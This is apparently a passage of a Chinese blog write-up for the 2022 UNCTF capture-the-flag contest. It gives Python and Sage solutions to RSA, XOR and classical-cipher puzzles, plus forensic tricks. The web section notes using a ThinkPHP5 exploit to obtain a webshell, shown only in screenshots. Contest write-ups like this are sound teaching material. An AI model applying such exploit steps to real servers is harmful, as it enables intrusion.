<p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221117140458328.png" alt="" loading="lazy"></p>
<p>输入后的到flag：</p>
<p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221117135322609.png" alt="" loading="lazy"></p>
<p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221117141106499.png" alt="" loading="lazy"></p>
<h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="md5-1-西南科技大学"><a href="#md5-1-西南科技大学" class="headerlink" title="md5-1-西南科技大学"></a>md5-1-西南科技大学</h3><p>找个在线网站批量解密即可~</p>
<h3 id="dddd-西南科技大学"><a href="#dddd-西南科技大学" class="headerlink" title="dddd-西南科技大学"></a>dddd-西南科技大学</h3><pre><code class="line-numbers language-python">str=&quot;110/01/0101/0/1101/0000100/0100/11110/111/110010/0/1111/10000/111/110010/1000/110/111/0/110010/00/00000/101/111/1/0000010&quot;
r=&#39;&#39;
for i in range(len(str)):
    if str[i]==&#39;1&#39;:
        r+=&#39;.&#39;
    elif str[i]==&#39;0&#39;:
        r+=&#39;-&#39;
    else :
        r+=&#39; &#39;

print(r)</code></pre>
<p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221118142655886.png" alt="" loading="lazy"></p>
<h3 id="caesar-西南科技大学"><a href="#caesar-西南科技大学" class="headerlink" title="caesar-西南科技大学"></a>caesar-西南科技大学</h3><p>在网上找的代码：</p>
<pre><code class="line-numbers language-python"># Caeser Cipher  

import sys,os  

MyCypher = 25 

MyDict = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#39; 

plaintext = &#39;Hello World!&#39; 
cryptmsg = &#39;&#39;  

def encrypt(text, cypher):  
    out_text = &#39;&#39;  
    for e in text:  
        x = e  
        if (e in MyDict):  
            idx = MyDict.find(e)  
            idx = idx + cypher  
            idx = idx % len(MyDict)  
            x = MyDict[idx]  
        out_text = &quot;%s%c&quot; % (out_text, x)  
    return out_text  

def decrypt(msg, cypher):  
    out_text = &#39;&#39;  
    for e in msg:  
        x = e  
        if (e in MyDict):  
            idx = MyDict.find(e)  
            idx = idx - cypher + len(MyDict)  
            idx = idx % len(MyDict)  
            x = MyDict[idx]  
        out_text = &quot;%s%c&quot; % (out_text, x)  
    return out_text  

def ask_cypher():  
    user_input = raw_input(&#39;Input Cypher: &#39;)  
    return long(user_input)  

def ask_text():  
    user_input = raw_input(&#39;Input Text: &#39;)  
    return user_input  

def ask_action():  
    print &#39;-----------------------&#39; 
    print &#39;0 - Exit&#39; 
    print &#39;1 - Encrypt&#39; 
    print &#39;2 - Decrypt&#39; 
    print &#39;-----------------------&#39; 
    user_input = raw_input(&#39;Select You Action: &#39;)  
    if user_input in [&#39;0&#39;, &#39;1&#39;, &#39;2&#39;]:  
        if user_input == &#39;0&#39;:  
            return &#39;exit&#39; 
        elif user_input == &#39;1&#39;:  
            return &#39;enc&#39; 
        elif user_input == &#39;2&#39;:  
            return &#39;dec&#39; 
    else:  
        return &#39;exit&#39; 

# ---------------------------------------------------------------  
# Program Start Here  
# ---------------------------------------------------------------  
MyCypher = ask_cypher()  
print &#39;Cypher: %d&#39; % MyCypher  

for i in range(0, 100):  
    action = ask_action()  

    if action == &#39;dec&#39;:  
        cryptmsg = ask_text()  
        print decrypt(cryptmsg, MyCypher)  
    elif action == &#39;enc&#39;:  
        plaintext = ask_text()  
        print encrypt(plaintext, MyCypher)  
    else:  
        print &#39;Exit!&#39; 
        break</code></pre>
<p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221116165624834.png" alt="" loading="lazy"></p>
<h3 id="md5-2-西南科技大学"><a href="#md5-2-西南科技大学" class="headerlink" title="md5-2-西南科技大学"></a>md5-2-西南科技大学</h3><pre><code class="line-numbers language-python">list=[0x4c614360da93c0a041b22e537de151eb,
0xc1fd731c6d60040369908b4a5f309f41,
0x80fdc84bbb5ed9e207a21d5436efdcfd,
0xb48d19bb99a7e6bb448f63b75bc92384,
0x39eaf918a52fcaa5ed9195e546b021c1,
0x795d6869f32db43ff5b414de3c235514,
0xf59a054403f933c842e9c3235c136367,
0xc80b37816048952a3c0fc9780602a2fa,
0x810ecef68e945c3fe7d6accba8b329bd,
0xcad06891e0c769c7b02c228c8c2c8865,
0x470a96d253a639193530a15487fea36f,
0x470a96d253a639193530a15487fea36f,
0x4bdea6676e5335f857fa8e47249fa1d8,
0x810ecef68e945c3fe7d6accba8b329bd,
0xedbb7ab78cde98a07b9b5a2ab284bf0a,
0x44b43e07e9af05e3b9b129a287e5a8df,
0xa641c08ed66b55c9bd541fe1b22ce5c0,
0xabed1f675819a2c0f65c9b7da8cab301,
0x738c486923803a1b59ef17329d70bbbd,
0x7e209780adf2cd1212e793ae8796ed7c,
0xa641c08ed66b55c9bd541fe1b22ce5c0,
0xa641c08ed66b55c9bd541fe1b22ce5c0,
0x636a84a33e1373324d64463eeb8e7614,
0x6ec65b4ab061843b066cc2a2f16820d5,
0xa4a39b59eb036a4a8922f7142f874114,
0x8c34745bd5b5d42cb3efe381eeb88e4b,
0x5b1ba76b1d36847d632203a75c4f74e2,
0xd861570e7b9998dbafb38c4f35ba08bc,
0x464b7d495dc6019fa4a709da29fc7952,
0x8eb69528cd84b73d858be0947f97b7cc,
0xdd6ac4c783a9059d11cb0910fc95d4a,
0x4b6b0ee5d5f6b24e6898997d765c487c,
0xb0762bc356c466d6b2b8f6396f2e041,
0x8547287408e2d2d8f3834fc1b90c3be9,
0x82947a7d007b9854fa62efb18c9fd91f,
0x8ddafe43b36150de851c83d80bd22b0a,
0xc7b36c5f23587e285e528527d1263c8b,
0x2a0816e8af86e68825c9df0d63a28381,
0x63ce72a42cf62e6d0fdc6c96df4687e3]

result=[]
for i in range(0,len(list)):
    if(i==0):
        result.append(list[0])
    else :
        result.append(list[i]^result[i-1])

for i in range(0,len(result)):
    print(hex(result[i])[2:])</code></pre>
<p>输出再次在线解密即可：</p>
<p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221116211723907.png" alt="" loading="lazy"></p>
<h3 id="babyRSA-广东海洋大学"><a href="#babyRSA-广东海洋大学" class="headerlink" title="babyRSA-广东海洋大学"></a>babyRSA-广东海洋大学</h3><p>在网上找的RSA已知明文攻击的轮子，sage在线解密：</p>
<pre><code class="line-numbers language-python">#from Crypto.Util.number import *
import os
import hashlib
import gmpy2
e = 6
c = 15389131311613415508844800295995106612022857692638905315980807050073537858857382728502142593301948048526944852089897832340601736781274204934578234672687680891154129252310634024554953799372265540740024915758647812906647109145094613323994058214703558717685930611371268247121960817195616837374076510986260112469914106674815925870074479182677673812235207989739299394932338770220225876070379594440075936962171457771508488819923640530653348409795232033076502186643651814610524674332768511598378284643889355772457510928898105838034556943949348749710675195450422905795881113409243269822988828033666560697512875266617885514107
n = 25300208242652033869357280793502260197802939233346996226883788604545558438230715925485481688339916461848731740856670110424196191302689278983802917678262166845981990182434653654812540700781253868833088711482330886156960638711299829638134615325986782943291329606045839979194068955235982564452293191151071585886524229637518411736363501546694935414687215258794960353854781449161486836502248831218800242916663993123670693362478526606712579426928338181399677807135748947635964798646637084128123883297026488246883131504115767135194084734055003319452874635426942328780711915045004051281014237034453559205703278666394594859431
kbits = 60 # x的未知bit数目
m0 = 11941439146252171444944646015445273361862078914338385912062672317789429687879409370001983412365416202240
PR.&lt;x&gt; = PolynomialRing(Zmod(n))
f = (m0 + x)^e - c
f = f.monic()
x0 = f.small_roots(X=2^kbits,beta=1)[0] # 在0 - 2^kbits范围内求解小根，beta为1和上述分析的beta一致，也就是对应factor为N
print(x0)</code></pre>
<p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221117092320165.png" alt="image-20221117092320165" loading="lazy"></p>
<p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221117092333377.png" alt="image-20221117092333377" loading="lazy"></p>
<h3 id="ezRSA-广东海洋大学"><a href="#ezRSA-广东海洋大学" class="headerlink" title="ezRSA-广东海洋大学"></a>ezRSA-广东海洋大学</h3><p>在线分解n=p**4，得到p：</p>
<p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221117093454398.png" alt="image-20221117093454398" loading="lazy"></p>
<pre><code class="line-numbers language-python">import libnum

n=62927872600012424750752897921698090776534304875632744929068546073325488283530025400224435562694273281157865037525456502678901681910303434689364320018805568710613581859910858077737519009451023667409223317546843268613019139524821964086036781112269486089069810631981766346242114671167202613483097500263981460561
c=56959646997081238078544634686875547709710666590620774134883288258992627876759606112717080946141796037573409168410595417635905762691247827322319628226051756406843950023290877673732151483843276348210800329658896558968868729658727981445607937645264850938932045242425625625685274204668013600475330284378427177504
p=89065756791595323358603857939783936930073695697065732353414009005162022399741
phi_n=p**4-p**3
e=65537
d=libnum.invmod(e,phi_n)
m=pow(c,d,n)

print(libnum.n2s(m))</code></pre>
<p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221117094203988.png" alt="image-20221117094203988" loading="lazy"></p>
<h3 id="easy-RSA-中国人民公安大学"><a href="#easy-RSA-中国人民公安大学" class="headerlink" title="easy_RSA-中国人民公安大学"></a>easy_RSA-中国人民公安大学</h3><p>已知部分p的RSA问题，找轮子，sage解密：</p>
<p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221117110630996.png" alt="image-20221117110630996" loading="lazy"></p>
<pre><code class="line-numbers language-python">n = 102089505560145732952560057865678579074090718982870849595040014068558983876754569662426938164259194050988665149701199828937293560615459891835879217321525050181965009152805251750575379985145711513607266950522285677715896102978770698240713690402491267904700928211276700602995935839857781256403655222855599880553
p0 = 8183408885924573625481737168030555426876736448015512229437332241283388177166503450163622041857
p_fake = p0 &lt;&lt; 200

pbits = 512
kbits = 200  
pbar = p_fake &amp; (2^pbits-2^kbits)  
print(&quot;upper %d bits (of %d bits) is given&quot; % (pbits-kbits, pbits))

PR.&lt;x&gt; = PolynomialRing(Zmod(n))  
f = x + pbar  

x0 = f.small_roots(X=2^kbits, beta=0.5)[0]  # find root &lt; 2^kbits with factor &gt;= n^0.3  
print(hex(int(x0 + pbar)))</code></pre>
<pre><code class="line-numbers language-python">from Crypto.Util.number import *
from gmpy2 import *
import libnum

p0 = 8183408885924573625481737168030555426876736448015512229437332241283388177166503450163622041857
p_fake = p0 &lt;&lt; 200
print(hex(p_fake))
p=0xfb14fd93d89af7d5313718a665b4dd20bc6263c565e01821963ea70ff55d57ab32e859d845d901392f25bb82633c4630e6218f3fff8b84c3ae1dc65ad6f3cc5d
n=102089505560145732952560057865678579074090718982870849595040014068558983876754569662426938164259194050988665149701199828937293560615459891835879217321525050181965009152805251750575379985145711513607266950522285677715896102978770698240713690402491267904700928211276700602995935839857781256403655222855599880553
q=n//p
c=6423951485971717307108570552094997465421668596714747882611104648100280293836248438862138501051894952826415798421772671979484920170142688929362334687355938148152419374972520025565722001651499172379146648678015238649772132040797315727334900549828142714418998609658177831830859143752082569051539601438562078140
e=0x10001
phi_n=(p-1)*(q-1)
d=libnum.invmod(e,phi_n)
m=pow(c,d,n)
print(long_to_bytes(m))</code></pre>
<p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221117110717023.png" alt="image-20221117110717023" loading="lazy"></p>
<h3 id="Single-table-西南科技大学"><a href="#Single-table-西南科技大学" class="headerlink" title="Single table-西南科技大学"></a>Single table-西南科技大学</h3><p>由条件可知是，playfair密码，其中规则同一行找左边，同一列找上边，不同行不同列找对角，最后把X去掉：</p>
<p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221117144537403.png" alt="image-20221117144537403" loading="lazy"></p>
<h3 id="Multi-table-西南科技大学"><a href="#Multi-table-西南科技大学" class="headerlink" title="Multi table-西南科技大学"></a>Multi table-西南科技大学</h3><pre><code class="line-numbers language-python">from string import ascii_uppercase
from random import randint,shuffle
from binascii import b2a_hex,a2b_hex

flag=&quot;UNCTF{}&quot;

base_table=[&#39;J&#39;, &#39;X&#39;, &#39;I&#39;, &#39;S&#39;, &#39;E&#39;, &#39;C&#39;, &#39;R&#39;, &#39;Z&#39;, &#39;L&#39;, &#39;U&#39;, &#39;K&#39;, &#39;Q&#39;, &#39;Y&#39;, &#39;F&#39;, &#39;N&#39;, &#39;V&#39;, &#39;T&#39;, &#39;P&#39;, &#39;O&#39;, &#39;G&#39;, &#39;A&#39;, &#39;H&#39;, &#39;D&#39;, &#39;W&#39;, &#39;M&#39;, &#39;B&#39;]

table={}
for i in range(26):
    table[i]=ascii_uppercase[i:]+ascii_uppercase[:i]

str=&#39;UNCTF&#39;
out=&#39;SDCGW&#39;
t=[base_table.index(str[0]),base_table.index(str[1]),base_table.index(str[2]),base_table.index(str[3]),base_table.index(str[4])]
key=[]
for j in range(0,4):
    for i in range(26):
        if(table[i][t[j]]==out[j]):
            print(i)
            key.append(i)
            break
print(key)

x=0
c=&quot;SDCGW{MPN_VHG_AXHU_GERA_SM_EZJNDBWN_UZHETD}&quot;
#UNCTF{WOW_YOU_KNOW_THIS_IS_VIGENERE_CIPHER}
m=&#39;&#39;
for i in range(len(c)):
    for j in range(0,26):
        if(c[i]==table[key[x%4]][j]):
            print(base_table[j],end=&#39;&#39;)
            x+=1
            break</code></pre>
<h3 id="ezxor-浙江师范大学"><a href="#ezxor-浙江师范大学" class="headerlink" title="ezxor-浙江师范大学"></a>ezxor-浙江师范大学</h3><p>流密码many-time-padding，参考博客<a href="https://4xwi11.github.io/posts/43deb916/，改轮子：" target="_blank" rel="noopener">https://4xwi11.github.io/posts/43deb916/，改轮子：</a></p>
<pre><code class="line-numbers language-python">import Crypto.Util.strxor as xo
import codecs
import numpy as np


def ischr(x):
    if ord(&#39;a&#39;) &lt;= x &lt;= ord(&#39;z&#39;):
        return True
    if ord(&#39;A&#39;) &lt;= x &lt;= ord(&#39;Z&#39;):
        return True
    return False


def infer(p_index, p_pos):
    if msg[p_index, p_pos] != 0:
        return
    msg[p_index, p_pos] = ord(&#39; &#39;)
    for x in range(len(c)):
        if x != p_index:
            msg[x][p_pos] = xo.strxor(c[x], c[p_index])[p_pos] ^ ord(&#39; &#39;)


dat = []

def get_space():
    for t_index, x in enumerate(c):
        res = [xo.strxor(x, y) for y in c if x != y]
        f = lambda t_pos: len(list(filter(ischr, [s[t_pos] for s in res])))
        cnt = [f(t_pos) for t_pos in range(len(x))]
        for t_pos in range(len(x)):
            dat.append((f(t_pos), t_index, t_pos))

# 第十二行和第六行长度不一，末尾填充0就好了
c = [codecs.decode(x.strip().encode(), &#39;hex&#39;) for x in open(&#39;C:\\ymj_file\\re-ctf\\22校内赛\ezxor\\a.txt&#39;, &#39;r&#39;).readlines()]

msg = np.zeros([len(c), len(c[0])], dtype=int)

get_space()

dat = sorted(dat)[::-1]
for w, index, pos in dat:
    infer(index, pos)


def know(p_index, p_pos, ch):
    msg[p_index, p_pos] = ord(ch)
    for x in range(len(c)):
        if x != p_index:
            msg[x][p_pos] = xo.strxor(c[x], c[p_index])[p_pos] ^ ord(ch)


# 需要手动更改的就是这个地方，按照意思，替换你确定的字母
know(0, 4, &#39;h&#39;)
know(0, 13, &#39;o&#39;)
know(3, 13, &#39;p&#39;)
know(3, 19, &#39;h&#39;)
know(5, 24, &#39;e&#39;)
know(5, 25, &#39; &#39;)
know(5, 26, &#39;i&#39;)

print(&#39;\n&#39;.join([&#39;&#39;.join([chr(c) for c in x]) for x in msg]))

# 其实只需要知道一条正确的明文就够了，key=C1^M1
key = xo.strxor(c[0], &#39;&#39;.join([chr(c) for c in msg[0]]).encode())
print(key)</code></pre>
<h3 id="Fermat-西南科技大学"><a href="#Fermat-西南科技大学" class="headerlink" title="Fermat-西南科技大学"></a>Fermat-西南科技大学</h3><p>根据费马小定理，<br>$$<br>gift+x=x*p<br>$$</p>
<p>$$<br>x(p-1)=gift<br>$$</p>
<p>$$<br>2^{(p-1)}≡ 1;mod;p<br>$$</p>
<p>==&gt;<br>$$<br>p=gcd(2^{gift}-1,n)<br>$$</p>
<pre><code class="line-numbers language-python">import libnum
from Crypto.Util.number import *
from gmpy2 import *

n = 19793392713544070457027688479915778034777978273001720422783377164900114996244094242708846944654400975309197274029725271852278868848866055341793968628630614866044892220651519906766987523723167772766264471738575578352385622923984300236873960423976260016266837752686791744352546924090533029391012155478169775768669029210298020072732213084681874537570149819864200486326715202569620771301183541168920293383480995205295027880564610382830236168192045808503329671954996275913950214212865497595508488636836591923116671959919150665452149128370999053882832187730559499602328396445739728918488554797208524455601679374538090229259
gift = 28493930909416220193248976348190268445371212704486248387964331415565449421099615661533797087163499951763570988748101165456730856835623237735728305577465527656655424601018192421625513978923509191087994899267887557104946667250073139087563975700714392158474439232535598303396614625803120915200062198119177012906806978497977522010955029535460948754300579519507100555238234886672451138350711195210839503633694262246536916073018376588368865238702811391960064511721322374269804663854748971378143510485102611920761475212154163275729116496865922237474172415758170527875090555223562882324599031402831107977696519982548567367160
m=pow(2,gift,n)-1

a=m
b=n
r = a % b
while r!=0:
    a=b
    b=r
    r=a%b
print(b)

p=b
q=124404825607078034603149483270846649231000805906516561180420089586930900593352193075880169157349174090099399769277704379420461280611221204110761706560475928604607109520494407679757089325889840063141194554412310300922587311873405975863321941806225072354969183332411306641431067105413758457445734517375857368579

e=0x10001
phi_n=(p-1)*(q-1)
d=libnum.invmod(e,phi_n)
c=388040015421654529602726530745444492795380886347450760542380535829893454552342509717706633524047462519852647123869277281803838546899812555054346458364202308821287717358321436303133564356740604738982100359999571338136343563820284214462840345638397346674622692956703291932399421179143390021606803873010804742453728454041597734468711112843307879361621434484986414368504648335684946420377995426633388307499467425060702337163601268480035415645840678848175121483351171989659915143104037610965403453400778398233728478485618134227607237718738847749796204570919757202087150892548180370435537346442018275672130416574430694059
m=pow(c,d,n)
print(long_to_bytes(m))</code></pre>
<p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221118092132508.png" alt="image-20221118092132508" loading="lazy"></p>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="签到-吉林警察学院"><a href="#签到-吉林警察学院" class="headerlink" title="签到-吉林警察学院"></a>签到-吉林警察学院</h3><p>群里给了flag</p>
<h3 id="ezgame-浙江师范大学"><a href="#ezgame-浙江师范大学" class="headerlink" title="ezgame-浙江师范大学"></a>ezgame-浙江师范大学</h3><p>把血量改成0，重新加载html：</p>
<p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221116202857997.png" alt="image-20221116202857997" loading="lazy"></p>
<p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221116202829711.png" alt="image-20221116202829711" loading="lazy"></p>
<h3 id="我太喜欢bilibili大学啦–中北大学"><a href="#我太喜欢bilibili大学啦–中北大学" class="headerlink" title="我太喜欢bilibili大学啦–中北大学"></a>我太喜欢bilibili大学啦–中北大学</h3><p>打开页面直接看到flag：</p>
<p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221117123451675.png" alt="image-20221117123451675" loading="lazy"></p>
<h3 id="给你一刀-西南科技大学"><a href="#给你一刀-西南科技大学" class="headerlink" title="给你一刀-西南科技大学"></a>给你一刀-西南科技大学</h3><p>thinkphp5的漏洞，用莲花的exp：</p>
<p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221118093451420.png" alt="image-20221118093451420" loading="lazy"></p>
<p>getshell后得到一句话木马，post即可：</p>
<p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221118093253637.png" alt="image-20221118093253637" loading="lazy"></p>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="社什么社-湖南警察学院"><a href="#社什么社-湖南警察学院" class="headerlink" title="社什么社-湖南警察学院"></a>社什么社-湖南警察学院</h3><p>搜索湖南著名景点，第一个就是：</p>
<p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221117132904940.png" alt="image-20221117132904940" loading="lazy"></p>
<p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221117132832711.png" alt="image-20221117132832711" loading="lazy"></p>
<h3 id="magic-word-西南科技大学"><a href="#magic-word-西南科技大学" class="headerlink" title="magic_word-西南科技大学"></a>magic_word-西南科技大学</h3><p>winhex查看word的document.xml，</p>
<p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221117215857086.png" alt="image-20221117215857086" loading="lazy"></p>
<p>在线零宽字节解密：</p>
<p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221117215940843.png" alt="image-20221117215940843" loading="lazy"></p>
<h3 id="找得到我吗-闽南师范大学"><a href="#找得到我吗-闽南师范大学" class="headerlink" title="找得到我吗-闽南师范大学"></a>找得到我吗-闽南师范大学</h3><p>同前面的题目，word改成zip后缀，找到document.xml查看即可：</p>
<p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221118093836905.png" alt="image-20221118093836905" loading="lazy"></p>
<h3 id="syslog-浙江师范大学"><a href="#syslog-浙江师范大学" class="headerlink" title="syslog-浙江师范大学"></a>syslog-浙江师范大学</h3><p>syslog找到密码：</p>
<p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221118101406326.png" alt="image-20221118101406326" loading="lazy"></p>
<p>base64解密得到压缩包密码：</p>
<p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221118101446316.png" alt="image-20221118101446316" loading="lazy"></p>
<p>打开压缩包即可。</p>
<h3 id="In-the-Morse-Garden-陆军工程大学"><a href="#In-the-Morse-Garden-陆军工程大学" class="headerlink" title="In_the_Morse_Garden-陆军工程大学"></a>In_the_Morse_Garden-陆军工程大学</h3><p>PDF转word文件可以看到：</p>
<p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221118105222600.png" alt="image-20221118105222600" loading="lazy"></p>
<p>base64解密得到：</p>
<pre><code>依古比古玛卡巴卡玛卡巴卡 依古比古玛卡巴卡 玛卡巴卡依古比古 依古比古依古比古玛卡巴卡玛卡巴卡依古比古玛卡巴卡 依古比古玛卡巴卡 玛卡巴卡依古比古 依古比古依古比古玛卡巴卡玛卡巴卡依古比古玛卡巴卡 玛卡巴卡玛卡巴卡 依古比古玛卡巴卡 玛卡巴卡依古比古玛卡巴卡 依古比古玛卡巴卡 依古比古依古比古玛卡巴卡玛卡巴卡依古比古玛卡巴卡 玛卡巴卡依古比古依古比古依古比古 依古比古玛卡巴卡 玛卡巴卡依古比古玛卡巴卡 依古比古玛卡巴卡 依古比古玛卡巴卡 依古比古玛卡巴卡 依古比古玛卡巴卡 依古比古玛卡巴卡 玛卡巴卡依古比古玛卡巴卡依古比古玛卡巴卡玛卡巴卡</code></pre><p>根据题目名字想到转换成摩斯电码解密：</p>
<pre><code>.-- .- -. ..--.- .- -. ..--.- -- .- -.- .- ..--.- -... .- -.- .- .- .- .- .- -.-.--</code></pre><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221118105303259.png" alt="image-20221118105303259" loading="lazy"></p>
<h3 id="zhiyin-中国人民公安大学"><a href="#zhiyin-中国人民公安大学" class="headerlink" title="zhiyin-中国人民公安大学"></a>zhiyin-中国人民公安大学</h3><p>winhex打开lanqiu.jpg，可知图片字节倒序：</p>
<p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221118110239743.png" alt="image-20221118110239743" loading="lazy"></p>
<p>修复：</p>
<pre><code class="line-numbers language-python">f1=open(&quot;C:\ymj_file\\re-ctf\\22校内赛\zhiyin\\lanqiu.jpg&quot;,&#39;rb&#39;)
f2=open(&quot;C:\ymj_file\\re-ctf\\22校内赛\zhiyin\\out.jpg&quot;,&#39;wb&#39;)
f2.write(f1.read()[::-1])</code></pre>
<p>打开后得到Go_p1ay：</p>
<p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221118112303821.png" alt="image-20221118112303821" loading="lazy"></p>
<p>winhex打开zhiyin.png，在最后看到摩斯密码，解密:</p>
<p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221118130508349.png" alt="image-20221118130508349" loading="lazy"></p>
<p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221118131655862.png" alt="image-20221118131655862" loading="lazy"></p>
<p>修复压缩包头，打开压缩包输入Go_p1ay_unc7f!!!即可：</p>
<p><img src="C:%5CUsers%5C%E8%A2%81%E6%A2%A6%E5%A8%87%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221118140927261.png" alt="image-20221118140927261" loading="lazy"></p>
</div><ul class="post-copyright"><li class="post-copyright-author"><strong>Post author: </strong>Theffth</li><li class="post-copyright-link"><strong>Post link: </strong><a href="http://theffth.github.io/2022/12/29/2022UNCTF-WP/" title="2022UNCTF WP">http://theffth.github.io/2022/12/29/2022UNCTF-WP/</a></li><li class="post-copyright-license"><strong>Copyright Notice: </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><svg class="icon"><use xlink:href="#icon-creative-commons-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-by-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-nc-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-sa-line"></use></svg></a> unless stating additionally.</li></ul></section></article><div class="post-nav"><div class="post-nav-item"></div><div class="post-nav-item"><a class="post-nav-next" href="/2020/11/08/shellshock-race-condition-%E7%90%86%E8%A7%A3%E4%B8%8E%E5%A4%8D%E7%8E%B0/" rel="next" title="shellshock &amp; race condition 原理与复现"><span class="post-nav-text">shellshock &amp; race condition 原理与复现</span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-right-s-line"></use></svg></a></div></div></div><div id="comment"><div class="comment-tooltip text-center"><span>点击按钮跳转 GitHub Issues 评论。</span><br><span>若没有本文 Issue，您可以使用 Comment 模版新建。</span><br></div></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2022 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> Theffth</span></div><div class="powered"><span>Powered by <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> v4.2.1</span><span class="footer-separator">|</span><span>Theme - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.2.0</span></div></footer><script src="/js/prism/prism.js" async></script><a class="hty-icon-button" id="goUp" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#6200ee" stroke-width="2" stroke-linecap="round"></circle></svg></a></div><script defer src="/js/utils.js"></script><script defer src="/js/hexo-theme-yun.js"></script></body></html>